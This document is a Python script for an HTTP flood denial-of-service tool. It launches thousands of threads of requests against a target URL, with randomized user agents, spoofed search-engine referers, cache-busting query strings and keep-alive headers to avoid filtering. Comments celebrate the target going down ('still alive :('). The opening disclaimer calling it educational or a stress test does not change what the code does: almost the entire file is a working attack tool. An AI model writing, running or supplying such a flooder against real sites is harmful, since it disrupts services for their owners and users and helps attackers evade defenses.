# STRICTLY FOR EDUCATIONAL PURPOSE. NOT RESPONSIBLE FOR ANY MISUSE. CAN BE USED FOR STRESS TEST
import requests
import threading
import sys
import logging
import random
import string
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from urllib.request import Request, urlopen
import urllib

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


USER_AGENTS_URL = "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt"
UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
]  # default user agent
THREAD_LIMIT = 10000  # default thread limit
KEEP_ALIVIE_MIN = 110  # min timeout to keep open connection :)
KEEP_ALIVIE_MAX = 120  # max timeout to keep open connection :)
THREADS = []
REFERERS = [
    "https://www.google.com/?q=",
    "https://search.yahoo.com/search?ei=UTF-8&p=",
    "https://www.bing.com/search?q=",
    "https://yandex.com/search/?text=",
    "http://www.usatoday.com/search/results?q=",
    "http://www.baidu.com/s?ie=utf-8&wd=",
    "https://search.lycos.com/web/?q=",
    "https://results.excite.com/serp?q=",
    "https://www.ask.com/web?o=0&l=dir&qo=serpSearchTopBox&q=",
    "https://www.wolframalpha.com/input/?i=",
    "http://engadget.search.aol.com/search?q=",
    "https://duckduckgo.com/?t=hk&ia=web&q=",
    "http://www.chacha.com/query?type=2&value=",
    "https://search.aol.co.uk/aol/search?s_chn=prt_bon&s_it=aoluk-homePage50&s_chn=hp&rp=&s_qt=&q=",
    "https://yippy.com/search?query=",
    "https://www.entireweb.com/web?q=",
    "https://www.gigablast.com/search?c=main&qlangcountry=en-us&q=",
]  # used to simulate that request is coming from some search engine :)


def performFlooding():
    global THREAD_LIMIT
    if len(sys.argv) == 0:
        logger.error("No arguments passed")
        return
    url = sys.argv[1]  # first argument is targeted URL
    logger.info(f"Targeted URL: {url}")
    if len(sys.argv) > 2:
        THREAD_LIMIT = sys.argv[2]
    response = requests.get(USER_AGENTS_URL) # get user agents to simulate request are coming from different devices :)
    if response.status_code == 200:
        UA = response.text.split("\n")
    elif response.status_code == 404:
        logger.error("Can't fetch User Agents")
    i = 0
    while True:
        if len(THREADS) < THREAD_LIMIT:
            ua = random.choice(UA)
            t = threading.Thread(target=worker, args=(url, ua))
            THREADS.append(t)
            t.start()
        else:
            continue


def worker(url, ua):
    try:
        q = "".join(
            random.choices(string.ascii_letters + string.digits, k=10)
        )  # generate random query string as keyword
        r = random.choice(REFERERS) + q
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        # add some qury parameter, to look like you're lookging for something :)
        query_params["q"] = q
        # rebuild URL
        new_query = urlencode(query_params, doseq=True)
        url = parsed_url._replace(query=new_query).geturl()
        host = parsed_url.hostname
        headers = {
            "User-Agent": ua, # set random user agent 
            "Cache-Control": "no-cache", # don't cache request, in the case same one repeats
            "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",  # accept most of the encoding
            "Referer": r,
            "Keep-Alive": str(
                random.randint(KEEP_ALIVIE_MIN, KEEP_ALIVIE_MAX)
            ),  # don't close it too soon, otherwise it's no use :)
            "Connection": "keep-alive", # keep it alive :)
            "Host": host,
        }
        req = Request(url, headers=headers)
        opener = urllib.request.build_opener()
        with opener.open(req) as response:
            status_code = response.getcode()
            output = response.read()
            if status_code != 200:
                logger.info(f"Request responded with {response.status_code}")
            else:
                logger.info(f"{url} still alive :(")
        # get the running thread out of the way :)
        current = threading.current_thread()
        if current in THREADS:
            logger.info(
                f"Removing thread from an array. Total threads pending: {len(THREADS)}"
            )
            THREADS.remove(current)
    except Exception as e:
        logger.info(f"Connection failed to connect: {str(e)}")
        # get some info where're we at :)
        current = threading.current_thread()
        if current in THREADS:
            logger.info(
                f"Removing thread from an array. Total threads pending: {len(THREADS)}"
            )
            THREADS.remove(current)


if __name__ == "__main__":
    performFlooding()
